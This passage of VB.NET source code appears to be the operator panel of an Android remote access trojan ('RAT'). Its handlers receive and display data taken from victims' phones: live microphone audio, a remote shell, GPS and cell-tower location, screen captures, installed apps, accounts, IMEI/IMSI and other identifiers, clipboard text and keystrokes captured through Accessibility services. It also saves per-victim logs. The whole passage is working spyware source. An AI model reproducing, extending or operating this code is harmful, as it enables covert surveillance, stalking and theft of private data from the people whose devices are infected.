                                Dim Byte_ As Byte() = DirectCast(SPLByte.GetValue(1), Byte())

                                If Microphone IsNot Nothing Then

                                    If Microphone.waveOut IsNot Nothing Then

                                        Microphone.waveOut.Write(Byte_)

                                    End If

                                End If

                            Catch ex As Exception

                            End Try


                        Case SecurityKey.getCommand

                            Try

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)

                                Dim handle As String = "Shell_Terminal_" & ClassClient.ClientRemoteAddress

                                Dim ShellTerminal As ShellTerminal = My.Application.OpenForms(handle)

                                If ShellTerminal Is Nothing Then

                                    ShellTerminal = New ShellTerminal

                                    ShellTerminal.Name = handle

                                    ShellTerminal.Title = String.Format("{0} - IP:{1}", "Shell Terminal", ClassClient.ClientAddressIP)

                                    ShellTerminal.Client = Client

                                    ShellTerminal.classClient = ClassClient

                                    DirectCast(ShellTerminal, Control).Show()

                                End If


                                ShellTerminal.ignore = True

                                ShellTerminal.OutText.DeselectAll()

                                Dim isLine As Boolean = False

                                Dim EV As String = "[Output value : " & SPL(2) & "]"

                                ShellTerminal.OutText.AppendText(EV)

                                Dim Counter As Integer = 0

                                For Each ea In SPL_lines

                                    If ShellTerminal.OutText.Lines.Length > 0 Then

                                        ShellTerminal.OutText.AppendText(vbNewLine & ea)

                                        isLine = True

                                    Else

                                        ShellTerminal.OutText.AppendText(ea & vbNewLine)

                                        isLine = False

                                    End If

                                    ShellTerminal.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)

                                    Counter += 1

                                    Application.DoEvents()

                                Next

                                ShellTerminal.PB.Value = 0

                                ShellTerminal.ignore = False

                                ShellTerminal.NewTag(isLine)

                                ShellTerminal.OutText.ReadOnly = False

                                If ShellTerminal.IAMNew = True Then

                                    ShellTerminal.IAMNew = False

                                End If

                            Catch ex As Exception

                            End Try
                        Case SecurityKey.getGSM

                            Try

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                If reso.oAssembly IsNot Nothing Then

                                    Dim _task = Task.Factory.StartNew(Of Object)(Function() As Object

                                                                                     Dim RetDATA As String() = reso.oObject.GetLatLng(SPL(1), SPL(2), SPL(3), SPL(4))

                                                                                     Return RetDATA

                                                                                 End Function)

                                    Dim data = Await _task

                                    Dim GetLocation As String() = data

                                    If Not GetLocation(0) = "-1" And Not GetLocation(1) = "-1" Then

                                        Dim handle As String = "Location_Manager_" & ClassClient.ClientRemoteAddress

                                        Dim LocationManager As LocationManager = My.Application.OpenForms(handle)

                                        If LocationManager Is Nothing Then

                                            reso.Directory_Exist(ClassClient)

                                            LocationManager = New LocationManager

                                            LocationManager.infoMaps = {ClassClient.FolderUSER, ClassClient.ClientName}

                                            LocationManager.Name = handle

                                            LocationManager.Title = String.Format("{0} - IP:{1}", "Location Manager", ClassClient.ClientAddressIP)

                                            LocationManager.Client = Client

                                            LocationManager.classClient = ClassClient

                                            DirectCast(LocationManager, Control).Show()

                                            LocationManager.Zoom = 15

                                        End If


                                        LocationManager.ImageSize.Width = 480

                                        LocationManager.ImageSize.Height = 360

                                        LocationManager.Markers = reso.Between("<param name=""markers_gsm"">", "</param>")

                                        LocationManager.Link = "https://api.mapbox.com/styles/v1/"

                                        LocationManager.Key = reso.Between("<param name=""access_token"">", "</param>")

                                        Dim get_style As String = reso.Maps_style()

                                        LocationManager.style = reso.Between("<param name=""" & get_style & """>", "</param>")

                                        LocationManager.Accuracy = "jump"

                                        LocationManager.Speed = "jump"

                                        LocationManager.List.Add({CDbl(GetLocation(0)), CDbl(GetLocation(1))})

                                        LocationManager.Text = LocationManager.Title

                                    End If

                                End If


                            Catch ex As Exception

                            End Try
                        Case SecurityKey.getGPS

                            If ClassClient.qitGPS = True Then

                                Return

                            End If

                            Try

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim handle As String = "Location_Manager_" & ClassClient.ClientRemoteAddress

                                Dim LocationManager As LocationManager = My.Application.OpenForms(handle)

                                If LocationManager Is Nothing Then

                                    reso.Directory_Exist(ClassClient)

                                    LocationManager = New LocationManager

                                    LocationManager.infoMaps = {ClassClient.FolderUSER, ClassClient.ClientName}

                                    LocationManager.Name = handle

                                    LocationManager.Title = String.Format("{0} - IP:{1}", "Location Manager", ClassClient.ClientAddressIP)

                                    LocationManager.Client = Client

                                    LocationManager.classClient = ClassClient

                                    DirectCast(LocationManager, Control).Show()

                                    LocationManager.Zoom = 15

                                End If

                                LocationManager.ImageSize.Width = 480

                                LocationManager.ImageSize.Height = 360

                                LocationManager.Markers = reso.Between("<param name=""markers_gps"">", "</param>")

                                LocationManager.Link = "https://api.mapbox.com/styles/v1/"

                                LocationManager.Key = reso.Between("<param name=""access_token"">", "</param>")

                                Dim get_style As String = reso.Maps_style()

                                LocationManager.style = reso.Between("<param name=""" & get_style & """>", "</param>")

                                LocationManager.Accuracy = SPL(2)

                                LocationManager.Speed = Codes.GetSpeed(SPL(3))

                                LocationManager.List.Add({CDbl(SPL(0)), CDbl(SPL(1))})

                            Catch ex As Exception

                            End Try
                        Case SecurityKey.ImageViewer

                            Try

                                If ClassClient.qit = True Then

                                    Return

                                End If

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(0)).Split({Data.SPL_ARRAY}, StringSplitOptions.None)

                                Dim handle As String = "Image_Viewer_" & ClassClient.ClientRemoteAddress

                                Dim ImageViewer As ImageViewer = My.Application.OpenForms(handle)

                                If ImageViewer Is Nothing Then

                                    ImageViewer = New ImageViewer

                                    ImageViewer.Name = handle

                                    ImageViewer.Title = String.Format("{0} - IP:{1} {2}", "Image Viewer", ClassClient.ClientAddressIP, SPL(1))

                                    ImageViewer.Client = Client

                                    ImageViewer.classClient = ClassClient

                                    If SPL(2) = "false" Then

                                        ImageViewer.info.Visible = False

                                    End If

                                    DirectCast(ImageViewer, Control).Show()

                                End If


                                Dim Byte_ As Byte() = DirectCast(SPLByte.GetValue(1), Byte())

                                Dim MS As New IO.MemoryStream(Byte_)

                                Dim _image As Image = Image.FromStream(MS)

                                ImageViewer.Viewer.Image = _image

                                ImageViewer.frames.Add(_image)

                                ImageViewer.fps += 1000

                                ImageViewer.time.Add(ImageViewer.fps)

                                ImageViewer.duration = CLng(SPL(3))

                                ImageViewer.LTime.Text = Codes.VideoTime(ImageViewer.fps) & Space(1) & Codes.VideoTime(CLng(SPL(3)))


                            Catch ex As Exception

                            End Try


                        Case SecurityKey.Apps


                            Try

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)


                                Dim handle As String = "Applications_" & ClassClient.ClientRemoteAddress

                                Dim Applications As Applications = My.Application.OpenForms(handle)

                                If Applications Is Nothing Then

                                    Applications = New Applications

                                    Applications.Name = handle

                                    Applications.Title = String.Format("{0} - IP:{1}", "Applications", ClassClient.ClientAddressIP)

                                    Applications.Client = Client

                                    Applications.classClient = ClassClient

                                    Applications.tmpAddressIP = ClassClient.ClientAddressIP

                                    Applications.tmpClientName = ClassClient.ClientName

                                    Applications.tmpCountry = ClassClient.Country

                                    Applications.tmpFolderUSER = ClassClient.FolderUSER

                                    Applications.DGV0.Columns(4).Width = reso.IconsSize

                                    Applications.DGV0.Columns(4).DisplayIndex = 0

                                    DirectCast(Applications, Control).Show()

                                End If

                                Applications.DGV0.Enabled = False

                                Applications.DGV0.Rows.Clear()

                                Dim Counter As Integer = 0

                                For Each ea In SPL_lines

                                    Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)

                                    Dim getPath As String = Nothing

                                    Select Case ay(1).ToLower
                                        Case "system"
                                            getPath = reso.res_Path & "\Icons\FillEllipse\System.png"
                                        Case "user"
                                            getPath = reso.res_Path & "\Icons\FillEllipse\User.png"
                                        Case Else
                                            getPath = reso.res_Path & "\Icons\FillEllipse\User.png"
                                    End Select

                                    Dim index As Integer = Applications.DGV0.Rows.Add(ay(0), ay(1), ay(2), ay(3), reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))

                                    If ay(2) = SPL(2) Then

                                        Applications.DGV0.Rows(index).DefaultCellStyle.ForeColor = SpySettings.DefaultColor_NewColorFiles

                                    End If

                                    Applications.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)

                                    Counter += 1

                                    Application.DoEvents()

                                Next

                                Applications.DGV0.Enabled = True

                                Applications.PB.Value = 0

                                If SpySettings.SAVING_DATA = "Yes" Then
                                    reso.Directory_Exist(ClassClient)
                                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Applications.DGV0, ClassClient.FolderUSER, "Applications",
                                        ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "Applications", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                End If

                            Catch ex As Exception

                            End Try


                        Case SecurityKey.editor

                            Try

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)

                                Dim handle As String = "editor_" & ClassClient.ClientRemoteAddress & "_" & SPL(2).Replace(Space(1), "_")

                                Dim Editor As Editor = My.Application.OpenForms(handle)

                                If Editor Is Nothing Then

                                    Editor = New Editor

                                    Editor.Name = handle

                                    Editor.Title = String.Format("{0} - IP:{1}", "Editor", ClassClient.ClientAddressIP)

                                    Editor.Client = Client

                                    Editor.classClient = ClassClient

                                    Editor.path = SPL(2)

                                    Editor.EditText.Text = SPL(1)

                                    DirectCast(Editor, Control).Show()

                                End If


                            Catch ex As Exception

                            End Try
                        Case SecurityKey.Account

                            Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)

                                Dim handle As String = "Account_Manager_" & ClassClient.ClientRemoteAddress

                                Dim AccountManager As AccountManager = My.Application.OpenForms(handle)

                                If AccountManager Is Nothing Then

                                    AccountManager = New AccountManager

                                    AccountManager.Name = handle

                                    AccountManager.Title = String.Format("{0} - IP:{1}", "Account Manager", ClassClient.ClientAddressIP)

                                    AccountManager.Client = Client

                                    AccountManager.classClient = ClassClient

                                    AccountManager.tmpAddressIP = ClassClient.ClientAddressIP

                                    AccountManager.tmpClientName = ClassClient.ClientName

                                    AccountManager.tmpCountry = ClassClient.Country

                                    AccountManager.tmpFolderUSER = ClassClient.FolderUSER

                                    AccountManager.DGV0.Columns(2).Width = reso.IconsSize

                                    AccountManager.DGV0.Columns(2).DisplayIndex = 0

                                    DirectCast(AccountManager, Control).Show()

                                End If

                                AccountManager.DGV0.Enabled = False

                                AccountManager.DGV0.Rows.Clear()

                                Dim Counter As Integer = 0

                                Dim getPath As String = reso.res_Path & "\Icons\FillEllipse\Account.png"

                                For Each ea In SPL_lines

                                    Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)

                                    AccountManager.DGV0.Rows.Add(ay(0), ay(1), reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))

                                    AccountManager.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)

                                    Counter += 1

                                    Application.DoEvents()

                                Next

                                AccountManager.DGV0.Enabled = True

                                AccountManager.PB.Value = 0

                                If SpySettings.SAVING_DATA = "Yes" Then
                                    reso.Directory_Exist(ClassClient)
                                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {AccountManager.DGV0, ClassClient.FolderUSER, "Account Manager",
                                        ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "Accounts", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                End If



                            Catch ex As Exception

                            End Try


                        Case SecurityKey.Information

                            Try

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim handle As String = "informations_" & ClassClient.ClientRemoteAddress

                                Dim information As information = My.Application.OpenForms(handle)

                                If information Is Nothing Then

                                    information = New information

                                    information.classClient = ClassClient

                                    information.Client = Client

                                    information.Name = handle

                                    information.Title = String.Format("{0} - IP:{1}", "informations", ClassClient.ClientAddressIP)

                                    information.Client = Client

                                    information.tmpTable = New DataTable("tmp")

                                    information.tmpTable.Columns.Add("Property")

                                    information.tmpTable.Columns.Add("Value")

                                    Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)

                                    information.LB1.Text = "Device"
                                    information.DGV0.Tag = information.LB1.Text
                                    information.LB2.Text = "System"
                                    information.DGV1.Tag = information.LB2.Text
                                    information.LB3.Text = "SIM"
                                    information.DGV2.Tag = information.LB3.Text
                                    information.LB4.Text = "Wi-Fi"
                                    information.DGV3.Tag = information.LB4.Text
                                    information.LB5.Text = "Battery"
                                    information.DGV4.Tag = information.LB5.Text
                                    information.LB6.Text = "Sound level"
                                    information.DGV5.Tag = information.LB6.Text
                                    information.LB7.Text = "Phone bar"
                                    information.DGV6.Tag = information.LB7.Text

                                    information.DGV0.Rows.Add("Name", SPL_lines(0))

                                    information.DGV0.Rows.Add("Model", SPL_lines(1))

                                    information.DGV0.Rows.Add("Board", SPL_lines(2))

                                    information.DGV0.Rows.Add("Brand", SPL_lines(3))

                                    information.DGV0.Rows.Add("Boot Loader", SPL_lines(4))

                                    information.DGV0.Rows.Add("Display", SPL_lines(5))

                                    information.DGV0.Rows.Add("Hardware", SPL_lines(6))

                                    information.DGV0.Rows.Add("Host", SPL_lines(7))

                                    information.DGV0.Rows.Add("ID", SPL_lines(8))

                                    information.DGV0.Rows.Add("Manufacturer", SPL_lines(9))

                                    information.DGV0.Rows.Add("Serial", SPL_lines(10))



                                    '//

                                    information.DGV1.Rows.Add("Name", SPL_lines(11))

                                    information.DGV1.Rows.Add("Release", SPL_lines(12))

                                    information.DGV1.Rows.Add("SDK", SPL_lines(13))

                                    information.DGV1.Rows.Add("Language", SPL_lines(14))

                                    '//

                                    information.DGV2.Rows.Add("Operator Name", SPL_lines(15))

                                    information.DGV2.Rows.Add("IMEI", SPL_lines(16))

                                    information.DGV2.Rows.Add("Country iso", SPL_lines(17))

                                    information.DGV2.Rows.Add("Serial", SPL_lines(18))

                                    information.DGV2.Rows.Add("Network Type", SPL_lines(19))

                                    information.DGV2.Rows.Add("IMSI", SPL_lines(20))

                                    '//

                                    information.DGV3.Rows.Add("MAC address", SPL_lines(21))

                                    information.DGV3.Rows.Add("SSID", SPL_lines(22))

                                    information.DGV3.Rows.Add("Link Speed", SPL_lines(23) & If(SPL_lines(23) = "null", "", "dBm"))

                                    information.DGV3.Rows.Add("Rssi", SPL_lines(24))


                                    '//

                                    information.DGV4.Rows.Add("Level", SPL_lines(25) & "%")

                                    information.DGV4.Rows.Add("USB", SPL_lines(26))

                                    information.DGV4.Rows.Add("Idle Mode (DOZE)", SPL_lines(27))

                                    information.DGV4.Rows.Add("Power Save Mode", SPL_lines(28))

                                    information.DGV4.Rows.Add("interactive", SPL_lines(29))


                                    Dim rowID As Integer = information.DGV5.Rows.Add("Ring", Nothing)

                                    Dim cell As DataGridViewComboBoxCell = information.DGV5.Rows(rowID).Cells(1)

                                    Dim ListItems As New List(Of String)

                                    For vul0 As Integer = 0 To CInt(SPL_lines(30).Trim)

                                        ListItems.Add(vul0)

                                    Next

                                    cell.DataSource = ListItems

                                    Try
                                        cell.Value = ListItems(ListItems.IndexOf(CInt(SPL_lines(31).Trim)))
                                    Catch ex As Exception

                                    End Try

                                    cell = New DataGridViewComboBoxCell

                                    rowID = information.DGV5.Rows.Add("Music", Nothing)

                                    ListItems = New List(Of String)

                                    cell = information.DGV5.Rows(rowID).Cells(1)

                                    For vul0 As Integer = 0 To CInt(SPL_lines(32).Trim)

                                        ListItems.Add(vul0)

                                    Next

                                    cell.DataSource = ListItems

                                    Try
                                        cell.Value = ListItems(ListItems.IndexOf(CInt(SPL_lines(33).Trim)))
                                    Catch ex As Exception

                                    End Try

                                    cell = New DataGridViewComboBoxCell

                                    rowID = information.DGV5.Rows.Add("Notification", Nothing)

                                    ListItems = New List(Of String)

                                    cell = information.DGV5.Rows(rowID).Cells(1)

                                    For vul0 As Integer = 0 To CInt(SPL_lines(34).Trim)

                                        ListItems.Add(vul0)

                                    Next

                                    cell.DataSource = ListItems

                                    Try
                                        cell.Value = ListItems(ListItems.IndexOf(CInt(SPL_lines(35).Trim)))
                                    Catch ex As Exception

                                    End Try

                                    cell = New DataGridViewComboBoxCell

                                    rowID = information.DGV5.Rows.Add("System", Nothing)

                                    ListItems = New List(Of String)

                                    cell = information.DGV5.Rows(rowID).Cells(1)

                                    For vul0 As Integer = 0 To CInt(SPL_lines(36).Trim)

                                        ListItems.Add(vul0)

                                    Next
                                    cell.DataSource = ListItems
                                    Try
                                        cell.Value = ListItems(ListItems.IndexOf(CInt(SPL_lines(37).Trim)))
                                    Catch ex As Exception

                                    End Try


                                    cell = New DataGridViewComboBoxCell

                                    rowID = information.DGV6.Rows.Add("Ringer Mode", Nothing)

                                    ListItems = New List(Of String)

                                    cell = information.DGV6.Rows(rowID).Cells(1)

                                    Dim modes As String() = {"Normal", "Vibrate", "Silent"}


                                    Dim getmode As String = modes(CInt(SPL_lines(38).Trim))

                                    For Each m In modes
                                        ListItems.Add(m)
                                    Next

                                    cell.DataSource = ListItems
                                    Try
                                        cell.Value = ListItems(ListItems.IndexOf(getmode))
                                    Catch ex As Exception

                                    End Try

                                    cell = New DataGridViewComboBoxCell

                                    rowID = information.DGV6.Rows.Add("Wi-Fi Mode", Nothing)

                                    ListItems = New List(Of String)

                                    cell = information.DGV6.Rows(rowID).Cells(1)

                                    Dim modeWiFi As String() = {"off", "on", "restart"}

                                    Dim getmodeWIFI As String = modeWiFi(CInt(SPL_lines(39).Trim))

                                    For Each m In modeWiFi
                                        ListItems.Add(m)
                                    Next

                                    cell.DataSource = ListItems
                                    Try
                                        cell.Value = ListItems(ListItems.IndexOf(getmodeWIFI))
                                    Catch ex As Exception

                                    End Try

                                    For Each gr As DataGridView In information.Panel1.Controls.OfType(Of DataGridView)()

                                        information.tmpTable.Rows.Add(gr.Tag, "sub")

                                        For i As Integer = 0 To gr.Rows.Count - 1

                                            information.tmpTable.Rows.Add(gr.Rows(i).Cells(0).Value, gr.Rows(i).Cells(1).Value)

                                        Next

                                    Next

                                    If SpySettings.SAVING_DATA = "Yes" Then
                                        If information.tmpTable IsNot Nothing Then
                                            reso.Directory_Exist(ClassClient)
                                            Dim DS As DataSet = New DataSet("info")
                                            DS.Tables.Add(information.tmpTable)
                                            information.DS = DS
                                            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {DS, ClassClient.FolderUSER, "informations",
                                            ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "informations", "info", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                        End If
                                    End If


                                    information.tmpAddressIP = ClassClient.ClientAddressIP

                                    information.tmpClientName = ClassClient.ClientName

                                    information.tmpCountry = ClassClient.Country

                                    information.tmpFolderUSER = ClassClient.FolderUSER

                                    DirectCast(information, Control).Show()

                                End If

                            Catch ex As Exception

                            End Try


                        Case SecurityKey.Keylogger

                            Try

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(0)).Split({Data.SPL_ARRAY}, StringSplitOptions.None)

                                Dim handle As String = "Keylogger_" & ClassClient.ClientRemoteAddress

                                Dim keylogg As Keylogger = My.Application.OpenForms(handle)

                                Dim flag As Integer = -1

                                If SPL(1) = "true" Then

                                    flag = 1

                                ElseIf SPL(1) = "false" Then

                                    flag = 0

                                Else

                                    flag = 1

                                End If

                                If ClassClient.Keylogg = True Then

                                    If keylogg Is Nothing Then

                                        keylogg = New Keylogger

                                        keylogg.Name = handle

                                        keylogg.Title = String.Format("{0} - IP:{1}", "Keylogger", ClassClient.ClientAddressIP)

                                        keylogg.Client = Client

                                        keylogg.Keylogger_Start.Enabled = False

                                        keylogg.classClient = ClassClient

                                        keylogg.DGV0.Columns(3).Width = reso.IconsSize

                                        keylogg.DGV0.Columns(3).DisplayIndex = 0

                                        keylogg.tmpAddressIP = ClassClient.ClientAddressIP

                                        keylogg.tmpClientName = ClassClient.ClientName

                                        keylogg.tmpCountry = ClassClient.Country

                                        keylogg.tmpFolderUSER = ClassClient.FolderUSER

                                        DirectCast(keylogg, Control).Show()

                                    End If

                                End If

                                If keylogg IsNot Nothing Then

                                    If flag = 0 Then

                                        Dim state As String = "Settings --> Accessibility --> Services"

                                        Dim getPath As String = reso.res_Path & "\Icons\FillEllipse\" & "NA" & ".png"

                                        keylogg.DGV0.Rows.Add(state, "", "", reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))

                                        If Not keylogg.BOXP.Enabled = False Then

                                            keylogg.BOXP.Enabled = False

                                        End If

                                    ElseIf flag = 1 Then

                                        If Not keylogg.BOXP.Enabled = True Then

                                            keylogg.BOXP.Enabled = True

                                        End If

                                    End If

                                    If SPL.Length > 2 Then

                                        If keylogg.BOXP.Enabled = False Then

                                            keylogg.BOXP.Enabled = True

                                        End If

                                        Dim state As String = Codes.AccessibilityEvent(CInt(SPL(3)))

                                        If state = "n/a" Then state = "NA"

                                        Dim getPath As String = reso.res_Path & "\Icons\FillEllipse\" & state & ".png"

                                        Dim id As Integer = keylogg.DGV0.Rows.Add(state, SPL(1), SPL(2), reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))

                                        Try
                                            If keylogg.DGV0.Rows(id).Displayed Then
                                                If keylogg.DGV0.FirstDisplayedScrollingRowIndex >= 0 Then
                                                    keylogg.DGV0.FirstDisplayedScrollingRowIndex = keylogg.DGV0.RowCount - 1
                                                    keylogg.DGV0.CurrentCell = keylogg.DGV0.Rows(keylogg.DGV0.RowCount - 1).Cells(1)
                                                    keylogg.DGV0.Rows(keylogg.DGV0.RowCount - 1).Selected = True
                                                End If
                                            End If
                                        Catch ex As Exception
                                        End Try

                                    End If

                                End If


                            Catch ex As Exception

                            End Try

                        Case SecurityKey.AppsProperties

                            Try

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)

                                Dim SPLArry As String() = SPL_lines(0).Split({Data.SPL_ARRAY}, StringSplitOptions.RemoveEmptyEntries)

                                Dim handle As String = "Properties_" & ClassClient.ClientRemoteAddress & "_" & SPLArry(1)

                                Dim AppsProperties As AppsProperties = My.Application.OpenForms(handle)

                                If AppsProperties Is Nothing Then

                                    AppsProperties = New AppsProperties

                                    AppsProperties.Name = handle

                                    AppsProperties.Title = String.Format("{0} - IP:{1}", "Properties", ClassClient.ClientAddressIP)

                                    DirectCast(AppsProperties, Control).Show()

                                    AppsProperties.LAppName.Text = SPLArry(0)

                                    AppsProperties.BoxIcons.Tag = SPLArry(1)

                                    Dim image = System.Drawing.Image.FromStream(New IO.MemoryStream(Convert.FromBase64String(SPLArry(2))))

                                    AppsProperties.BoxIcons.Image = image

                                    AppsProperties.LAppFlag.Text = SPLArry(3)

                                    AppsProperties.LAppInstallTime.Text = SPLArry(4)

                                    SPLArry = SPL_lines(1).Split({Data.SPL_ARRAY}, StringSplitOptions.RemoveEmptyEntries)

                                    Dim c0 As Control = AppsProperties.BOXPNL1.Controls(0)

                                    Dim c1 As Control = AppsProperties.BOXPNL1.Controls(1)

                                    Dim c2 As Control = AppsProperties.BOXPNL1.Controls(2)

                                    Dim c3 As Control = AppsProperties.BOXPNL1.Controls(3)

                                    Dim c4 As Control = AppsProperties.BOXPNL1.Controls(4)

                                    AppsProperties.BOXPNL1.Controls.Clear()

                                    For Each Permissions In SPLArry

                                        Dim lab As New Label

                                        lab.Dock = System.Windows.Forms.DockStyle.Top

                                        lab.Text = Permissions

                                        lab.TextAlign = System.Drawing.ContentAlignment.MiddleCenter

                                        lab.ForeColor = SpySettings.DefaultColor_Foreground

                                        lab.BackColor = SpySettings.DefaultColor_Background

                                        AppsProperties.BOXPNL1.Controls.Add(lab)

                                        Application.DoEvents()

                                    Next

                                    AppsProperties.BOXPNL1.Controls.Add(c0)

                                    AppsProperties.BOXPNL1.Controls.Add(c1)

                                    AppsProperties.BOXPNL1.Controls.Add(c2)

                                    AppsProperties.BOXPNL1.Controls.Add(c3)

                                    AppsProperties.BOXPNL1.Controls.Add(c4)


                                End If

                            Catch ex As Exception

                            End Try

                        Case SecurityKey.getClipboard

                            Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim handle As String = "Clipboard_Manager_" & ClassClient.ClientRemoteAddress

                                Dim ClipboardManager As ClipboardManager = My.Application.OpenForms(handle)

                                If ClipboardManager Is Nothing Then

                                    ClipboardManager = New ClipboardManager

                                    ClipboardManager.Name = handle

                                    ClipboardManager.Title = String.Format("{0} - IP:{1}", "Clipboard", ClassClient.ClientAddressIP)

                                    ClipboardManager.Client = Client

                                    ClipboardManager.classClient = ClassClient

                                    DirectCast(ClipboardManager, Control).Show()

                                End If

                                ClipboardManager.BoxClipboard.Text = SPL(1)
                            Catch ex As Exception

                            End Try

                        Case SecurityKey.acquire

                            Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(0)).Split({SPL_ARRAY}, StringSplitOptions.None)

                            ClassClient.power = If(SPL(1) = "power", True, False) ' power | release

                            Dim obj_Upd As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getUpdate & sockets.Data.SPL_SOCKET & "update", Codes.Encoding().GetBytes("null"), ClassClient}

                            ClassClient.Send(obj_Upd)

                        Case Else

                            If ClassClient IsNot Nothing Then

                                ClassClient.Close(Client)

                            End If

                    End Select


                    '########################################################################
                End If

            End If

        End Sub

        Private Shared Function Search(ByVal value As String, ByVal grDataGrid As DataGridView) As DataGridViewCell()
            Try
                Dim DGVC As DataGridViewCell() = (From row As DataGridViewRow In grDataGrid.Rows From cell As DataGridViewCell In row.Cells Select cell Where cell.Tag = value).ToArray
                Return DGVC
            Catch ex As Exception
                Return Nothing
            End Try
        End Function

        Private Shared Function Check(ByVal UUID As String) As Boolean
            Dim flag As Boolean = False
            Try
                Dim DGVC As DataGridViewCell() = Search(UUID, angelform.DGV0)
                If DGVC IsNot Nothing Then
                    flag = If(DGVC.ToArray.Length > 0, True, False)
                    For Each c In DGVC.ToArray
                        Dim Rows As Windows.Forms.DataGridViewRow = angelform.DGV0.Rows(c.RowIndex)
                        Dim infoX As Object() = Rows.Tag
                        Dim claClient As sockets.Client = DirectCast(infoX(0), sockets.Client)
                        If claClient IsNot Nothing Then
                            claClient.Rows = Nothing
                            angelform.Remove(Rows)
                            claClient.Close(CType(infoX(1), Net.Sockets.TcpClient))
                        End If
                    Next
                End If
            Catch ex As Exception
            End Try
            Return flag
        End Function
        Public Shared Function AddRows(ByVal obg As Object(), ByVal ParametersObject As Object(), ByVal ParametersUUID As String) As Object()

            Dim flag As Boolean = False

            If Not DirectCast(Data.angelform, Windows.Forms.Control).IsDisposed Then

                If SpySettings.vRemoving_Duplicates = "Yes" Then

                    flag = Check(ParametersUUID)

                End If



                Dim RowsID As Integer = angelform.DGV0.Rows.Add(ParametersObject(0), ParametersObject(1), ParametersObject(2), ParametersObject(3), ParametersObject(4), ParametersObject(5), ParametersObject(6), ParametersObject(7), ParametersObject(8), ParametersObject(9))

                angelform.DGV0.Rows(RowsID).Tag = obg

                angelform.DGV0.Rows(RowsID).Cells(9).Tag = ParametersUUID

                If Not flag Then

                    If SpySettings.NOTI_SOUND Then

                        If Notif_Sound.multi Then

                            If IO.File.Exists(Notif_Sound.path_File) Then

                                Try

                                    Notif_Sound.Snds.AddSound(reso.nameRAT & CStr(Notif_Sound.id), Notif_Sound.path_File)

                                    Notif_Sound.Snds.Play(reso.nameRAT & CStr(Notif_Sound.id))

                                    Notif_Sound.id += 1

                                Catch ex As Exception

                                End Try

                            End If

                        Else

                            If IO.File.Exists(Notif_Sound.path_File) Then

                                If Notif_Sound.aMedia.IsLoadCompleted Then

                                    Try
                                        Notif_Sound.aMedia.Play()
                                    Catch ex As InvalidOperationException

                                    End Try

                                End If

                            End If

                        End If

                    End If

                End If

                Return {RowsID, flag}

            End If

            Return {-1, flag}

        End Function

        Public Shared Function GetCollection(ByVal ID As String) As Object()

            Dim obj As Object()

            Try

                obj = DirectCast(infoServer.ClientsOnline.Item(ID), Object())

            Catch ex As Exception

                obj = {Nothing, Nothing}

            End Try

            Return obj

        End Function

        Public Shared Function Effect(ByVal img As Image) As Image

            Select Case SpySettings.EFFECTS_CAM
                Case "Normal"
                    Return img
                Case "Gray" 'gray
                    Dim bmp As Bitmap = New Bitmap(img.Width, img.Height)
                    Dim gMatrix As New System.Drawing.Imaging.ColorMatrix(
                        {
                                    New Single() {0.299, 0.299, 0.299, 0, 0},
                                    New Single() {0.587, 0.587, 0.587, 0, 0},
                                    New Single() {0.114, 0.114, 0.114, 0, 0},
